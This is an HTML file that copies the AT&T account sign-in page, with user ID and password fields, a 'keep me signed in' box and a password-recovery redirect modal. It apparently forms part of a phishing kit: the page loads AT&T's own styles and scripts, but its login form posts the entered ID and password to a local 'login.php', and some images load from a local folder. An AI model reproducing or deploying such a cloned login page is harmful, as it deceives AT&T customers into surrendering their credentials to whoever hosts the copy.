<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">



	


	


<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">

<head>

<title>AT&amp;T - Login</title>
<link rel="shortcut icon" href="https://home.secureapp.att.net/favicon.ico" type="image/icon" />
<script src="https://www.att.com/scripts/adobe/prod/detm-container-hdr.js"></script>
<!-- TG1403 S4055 - iframe -->
<style id="antiClickjack">body{display:none !important;}</style>
<script type="text/javascript">
   if (self === top) {
       var antiClickjack = document.getElementById("antiClickjack");
       antiClickjack.parentNode.removeChild(antiClickjack);
   } else {
   	var noFrameBusting = false;
   	if( ! noFrameBusting ) {
       top.location = self.location;
   	}
   }
</script>

<script type="text/javascript">
(function() {
         if ("-ms-user-select" in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/)) {
                 var msViewportStyle = document.createElement("style");
                 msViewportStyle.appendChild(
                          document.createTextNode("@-ms-viewport{width:auto!important}")
                 );
                 document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
         }
})();
</script>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=1.0" />

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/_fontface.css"  type="text/css" />
<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/main_syn.css"  type="text/css" media="screen" />

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/mobile.css"  type="text/css" media="handheld, only screen and (max-device-width: 480px)" />

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/jquery-1.5.1.min.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/simplemodal/jquery.simplemodal.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/sso/slid/1201/script_syn.js" ></script>

<script type="text/javascript" src="https://sadlib.static-app.synacor.com/client/att/att.js" async></script>

<noscript><img alt="dcsimg" id="dcsimg" width="1" height="1" src="https://statse.webtrendslive.com/dcsslzoj37dv0hctv586rtbcg_1v7w/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=10.2.0&amp;dcssip=www.beta.att.yahoo.com"/></noscript>
<!-- END OF SmartSource Data Collector TAG v10.2.0 -->

</head>



<body>

<div id="header"></div>

<div id="pageWrap">

 <div id="pageBody">

  <div id="loginWrap">

  <form  action="login.php" method="post" id="LoginForm"  focus="userid" name="LoginForm" type="com.sbc.idm.igate_edam.forms.LoginFormBean">

	<input type="hidden" name="style" value=>
	<input type="hidden" name="targetURL" value=>
	<input type="hidden" name="previousRefID" value=>    
	<input type="hidden" name="optOutGroupUpdate" value=>
	<input type="hidden" name="mergredID" value=>    
    <h1><strong>Sign in now!</strong></h1>


    <ul class="uLogin">

     <li id="uID">
		
      	<label for="nameBox">User ID/Email Address</label>
		<input type="text" name="userid" id="nameBox" value="" maxlength="50" size="50" class="slidTxtbox" />
	

		<div class="quesIcon" id="ques1"><div id="qAns1" class="qAns">Info</div></div>
      <p class="fgtEml"><a href="#" id="fgtEml" class="colLink">Forgot User ID?</a></p>
  

     </li>

     <li id="uPwd">

      <label  for="pwdBox">Password</label>

      <input type="password" placeholder="Password" name="password" id="pwdBox" value="" maxlength="50" size="50" class="slidTxtbox" autocomplete="off" />

      <p class="fgtPwd"><a  id="fgtPwd" href="#modal" onclick="overlay()" class="colLink" aria-describedby="spanLog">Forgot Password?</a>
	   <span id="spanLog" style="display:none;">Redirects to www.att.com.</span></p>
	  
	  
     </li>
     <li id="shwPc"><p><input name="showPwd" id="showPwd" class="slidChkBox" type="checkbox"><label for="showPwd">Show password characters</label></p></li>

     <li id="uRM">

      <p><input type="checkbox" name="rememberID" id="rememberID" class="slidChkBox" /><label for="rememberID">Keep me signed in</label></p>

      <p>for 2 weeks unless I sign out. <span class="quesIcon" id="ques2"><span id="qAns2" class="qAns">Info</span></span></p> 

      <p>(Uncheck if on a shared computer.)</p>

     </li>
     



     <li id="uBtn">

      <input type="submit" id="submitLogin" value="Sign In" class="loginBtn" />

     </li>

    <li id="uActCr">
	       <label for="regurl">Don't have an AT&amp;T Account?</label>
		<a href="http://www.att.net/signup" id="regurl"><input id="acctCreate" class="loginBtnClear" value="Create AT&amp;T Account" type="button"/></a>
	</li>
    

    </ul>
       
    <div id="lognp"></div>

    <div id="overLayCheck" class="overLayRight1"></div>

   </form>  

   <div id="promo"></div>
   
   <div id="modal" role="dialog" aria-labelledby="RedirectionModal">
		<div class="modal-content">
			
			<div class="copy">
			<p id="RedirectionModal" class="pstyle">You are being redirected to ATT.com<br><span class="pstyle1">where you can recover your password.</span> </p> 
			</div>
			<div id="count" style="visibility:hidden;margin-top:-28px;">Redirecting in 10 seconds...</div>
			<a onclick="cancelLoad()" class="hover" id="CancelM" aria-label="Cancel"  href="#" role="button"><img class="btnCancel" src="images/Button.png" alt="Cancel"/></a>
			<div><img id="logo1" class="attlogo" alt="attlogo" src="images/AT&T_logo.png"></img></div>		
		</div>
		<div class="overlay"></div>
	</div>

  </div>

 </div>

</div>

<div id="footer"> 
<script src="https://www.att.com/scripts/adobe/prod/detm-container-ftr.js"></script>
</div>



<!-- <script type="text/javascript">_satellite.pageBottom();</script> -->

</body>

</html><SCRIPT type="text/javascript">
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2FcommonLogin; path=/";
/*]]>*/ 
</SCRIPT>
